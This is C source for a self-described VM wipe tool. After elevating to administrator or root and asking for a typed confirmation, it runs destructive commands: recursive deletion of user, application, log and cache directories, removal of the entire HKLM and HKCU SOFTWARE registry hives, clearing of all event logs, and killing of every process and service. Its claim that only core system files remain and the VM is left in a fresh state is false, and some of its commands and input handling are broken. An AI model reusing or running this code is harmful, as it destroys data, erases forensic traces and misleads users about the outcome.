#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
    #include <direct.h>
    #include <shellapi.h>
    #define OS_WINDOWS
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #define OS_UNIX
#endif

void print_banner() {
    printf("================================\n");
    printf("  CROSS-PLATFORM VM WIPE TOOL   \n");
    printf("================================\n\n");
}

void wait_for_enter() {
    printf("Press ENTER to continue...");
    getchar();
}

int request_admin_privileges() {
#ifdef OS_WINDOWS
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    if (!isAdmin) {
        printf("[!] Administrative privileges required\n");
        printf("[*] Attempting to restart with elevated privileges...\n");
        
        char szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = {0};
            sei.cbSize = sizeof(SHELLEXECUTEINFO);
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;
            
            if (ShellExecuteEx(&sei)) {
                printf("[*] Please approve the UAC prompt and the program will restart with admin rights\n");
                return 0; // Exit this instance
            } else {
                printf("[!] Failed to request administrative privileges\n");
                printf("[!] Please manually run as Administrator\n");
                return 0;
            }
        }
    }
    printf("[+] Running with administrator privileges\n");
#else
    if (getuid() != 0) {
        printf("[!] Root privileges required\n");
        printf("[*] Attempting to restart with sudo...\n");
        
        char *args[1024];
        char exe_path[1024];
        
        // Get current executable path
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
        if (len != -1) {
            exe_path[len] = '\0';
            
            args[0] = "sudo";
            args[1] = exe_path;
            args[2] = NULL;
            
            printf("[*] Requesting sudo privileges...\n");
            execvp("sudo", args);
            
            // If execvp returns, it failed
            printf("[!] Failed to request root privileges\n");
            printf("[!] Please manually run with sudo\n");
            return 0;
        } else {
            printf("[!] Could not determine executable path\n");
            printf("[!] Please manually run with sudo\n");
            return 0;
        }
    }
    printf("[+] Running with root privileges\n");
#endif
    return 1;
}

void wipe_user_data() {
    printf("[*] Wiping all user data...\n");
    
#ifdef OS_WINDOWS
    char *win_commands[] = {
        "rmdir /s /q C:\\Users\\*",
        "del /f /s /q C:\\Users\\*.*",
        "rmdir /s /q C:\\ProgramData\\*",
        "del /f /s /q C:\\Temp\\*.*",
        "del /f /s /q C:\\Windows\\Temp\\*.*",
        "del /f /s /q %TEMP%\\*.*",
        NULL
    };
    
    for (int i = 0; win_commands[i] != NULL; i++) {
        printf("[*] %s\n", win_commands[i]);
        system(win_commands[i]);
    }
#else
    char *unix_commands[] = {
        "rm -rf /home/*",
        "rm -rf /Users/*",
        "rm -rf /root/*",
        "rm -rf /tmp/*",
        "rm -rf /var/tmp/*",
        NULL
    };
    
    for (int i = 0; unix_commands[i] != NULL; i++) {
        printf("[*] %s\n", unix_commands[i]);
        system(unix_commands[i]);
    }
#endif
}

void wipe_applications() {
    printf("[*] Removing installed applications...\n");
    
#ifdef OS_WINDOWS
    char *win_app_commands[] = {
        "rmdir /s /q \"C:\\Program Files\"",
        "rmdir /s /q \"C:\\Program Files (x86)\"",
        "rmdir /s /q C:\\ProgramData",
        "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /f",
        "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /f",
        "powershell \"Get-AppxPackage | Remove-AppxPackage\"",
        NULL
    };
    
    for (int i = 0; win_app_commands[i] != NULL; i++) {
        printf("[*] %s\n", win_app_commands[i]);
        system(win_app_commands[i]);
    }
#else
    char *unix_app_commands[] = {
        "rm -rf /opt/*",
        "rm -rf /usr/local/*",
        "rm -rf /Applications/*",
        "apt-get autoremove --purge -y 2>/dev/null || true",
        "yum remove -y '*' 2>/dev/null || true",
        "pacman -Rns $(pacman -Qtdq) 2>/dev/null || true",
        NULL
    };
    
    for (int i = 0; unix_app_commands[i] != NULL; i++) {
        printf("[*] %s\n", unix_app_commands[i]);
        system(unix_app_commands[i]);
    }
#endif
}

void wipe_logs_and_cache() {
    printf("[*] Wiping all logs and cache...\n");
    
#ifdef OS_WINDOWS
    char *win_log_commands[] = {
        "del /f /s /q C:\\Windows\\Logs\\*.*",
        "del /f /s /q C:\\Windows\\System32\\LogFiles\\*.*",
        "wevtutil el | Foreach-Object {wevtutil cl \"$_\"}",
        "del /f /s /q C:\\Windows\\Prefetch\\*.*",
        "cleanmgr /sagerun:1",
        NULL
    };
    
    for (int i = 0; win_log_commands[i] != NULL; i++) {
        printf("[*] %s\n", win_log_commands[i]);
        system(win_log_commands[i]);
    }
#else
    char *unix_log_commands[] = {
        "rm -rf /var/log/*",
        "rm -rf /var/cache/*",
        "rm -rf /var/spool/*",
        "rm -rf /Library/Caches/*",
        "rm -rf /Library/Logs/*",
        NULL
    };
    
    for (int i = 0; unix_log_commands[i] != NULL; i++) {
        printf("[*] %s\n", unix_log_commands[i]);
        system(unix_log_commands[i]);
    }
#endif
}

void wipe_registry_and_config() {
    printf("[*] Resetting configuration...\n");
    
#ifdef OS_WINDOWS
    char *win_config_commands[] = {
        "reg delete HKCU\\SOFTWARE /f",
        "reg delete HKLM\\SOFTWARE /f",
        "netsh wlan delete profile name=* i=*",
        "netsh int ip reset",
        "ipconfig /release",
        "ipconfig /flushdns",
        "netsh winsock reset",
        NULL
    };
    
    for (int i = 0; win_config_commands[i] != NULL; i++) {
        printf("[*] %s\n", win_config_commands[i]);
        system(win_config_commands[i]);
    }
#else
    char *unix_config_commands[] = {
        "rm -rf /etc/ssh/ssh_host_*",
        "rm -f /etc/machine-id",
        "rm -f /var/lib/dbus/machine-id",
        "rm -rf /etc/NetworkManager/system-connections/*",
        "rm -rf /var/lib/dhcp/*",
        NULL
    };
    
    for (int i = 0; unix_config_commands[i] != NULL; i++) {
        printf("[*] %s\n", unix_config_commands[i]);
        system(unix_config_commands[i]);
    }
#endif
}

void nuclear_clean() {
    printf("[*] NUCLEAR CLEAN - Maximum destruction...\n");
    
#ifdef OS_WINDOWS
    char *win_nuclear[] = {
        "taskkill /f /im *",
        "net stop * /y",
        "del /f /s /q C:\\*.log",
        "del /f /s /q C:\\*.tmp",
        "del /f /s /q C:\\*.bak",
        "rmdir /s /q C:\\$Recycle.Bin",
        "cipher /w:C:\\",
        NULL
    };
    
    for (int i = 0; win_nuclear[i] != NULL; i++) {
        printf("[*] %s\n", win_nuclear[i]);
        system(win_nuclear[i]);
    }
#else
    char *unix_nuclear[] = {
        "systemctl stop --all 2>/dev/null || true",
        "killall -9 -u $(users) 2>/dev/null || true",
        "find /var -type f -not -path '/var/lib/dpkg/*' -not -path '/var/lib/rpm/*' -delete 2>/dev/null || true",
        "rm -rf /media/* /mnt/* /srv/*",
        "dd if=/dev/zero of=/tmp/zerofill bs=1M 2>/dev/null || true; rm -f /tmp/zerofill",
        NULL
    };
    
    for (int i = 0; unix_nuclear[i] != NULL; i++) {
        printf("[*] %s\n", unix_nuclear[i]);
        system(unix_nuclear[i]);
    }
#endif
}

void regenerate_essentials() {
    printf("[*] Regenerating essential system components...\n");
    
#ifdef OS_WINDOWS
    char *win_regen[] = {
        "sfc /scannow",
        "dism /online /cleanup-image /restorehealth",
        "gpupdate /force",
        "netsh int ip reset",
        NULL
    };
    
    for (int i = 0; win_regen[i] != NULL; i++) {
        printf("[*] %s\n", win_regen[i]);
        system(win_regen[i]);
    }
#else
    char *unix_regen[] = {
        "ssh-keygen -A 2>/dev/null || true",
        "dbus-uuidgen > /etc/machine-id 2>/dev/null || true",
        "systemd-machine-id-setup 2>/dev/null || true",
        "update-initramfs -u 2>/dev/null || true",
        NULL
    };
    
    for (int i = 0; unix_regen[i] != NULL; i++) {
        printf("[*] %s\n", unix_regen[i]);
        system(unix_regen[i]);
    }
#endif
}

int main() {
    print_banner();
    
#ifdef OS_WINDOWS
    printf("[*] Detected: Windows\n");
#else
    printf("[*] Detected: Unix/Linux\n");
#endif

    printf("\n");
    wait_for_enter();
    
    printf("\n[*] Requesting administrator privileges...\n");
    if (!request_admin_privileges()) {
        printf("\nPress ENTER to exit...");
        getchar();
        return 1;
    }
    
    printf("\n[!] WARNING: This will COMPLETELY WIPE this VM\n");
    printf("[!] All user data, apps, registry/configs will be DESTROYED\n");
    printf("[!] Only core system files will remain\n");
    printf("[!] Type 'WIPE' to confirm: ");
    
    char response[10];
    scanf("%s", response);
    
    if (strcmp(response, "WIPE") != 0) {
        printf("[*] Operation cancelled - exact match required\n");
        printf("\nPress ENTER to exit...");
        getchar();
        getchar(); // consume the newline from scanf
        return 0;
    }
    
    printf("\n[*] Starting CROSS-PLATFORM SYSTEM WIPE...\n\n");
    
    wipe_user_data();
    wipe_applications();
    wipe_logs_and_cache();
    wipe_registry_and_config();
    nuclear_clean();
    regenerate_essentials();
    
    printf("\n[+] COMPLETE WIPE FINISHED!\n");
    printf("[*] VM is now in fresh state - reboot required\n");
    printf("[*] All user data and applications have been destroyed\n");
    
#ifdef OS_WINDOWS
    printf("[*] Run 'shutdown /r /t 0' to reboot\n");
#else
    printf("[*] Run 'reboot' to restart the system\n");
#endif
    
    printf("\nPress ENTER to exit...");
    getchar();
    getchar(); // consume the newline from scanf
    
    return 0;
}